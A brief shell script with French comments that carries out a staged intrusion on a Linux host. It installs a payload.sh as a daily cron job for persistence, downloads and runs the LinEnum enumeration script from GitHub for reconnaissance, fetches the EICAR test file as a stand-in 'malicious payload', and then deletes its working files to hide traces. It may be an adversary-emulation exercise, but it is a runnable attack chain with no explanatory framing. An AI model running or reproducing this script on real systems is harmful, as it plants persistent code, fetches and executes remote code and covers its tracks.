#!/bin/sh

#Persistance
cp ./payload.sh /tmp/payload.sh
crontab -l > mycron
echo "0 0 * * * /tmp/payload.sh" >> mycron
crontab mycron

#Reconnaissance
wget 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh'; chmod u+x ./LinEnum.sh; ./LinEnum.sh -r discover -e /tmp/ -t

#Téléchargement charge malveillante
wget 'https://secure.eicar.org/eicar_com.zip'

#Nettoyage
rm mycron
rm ./payload.sh
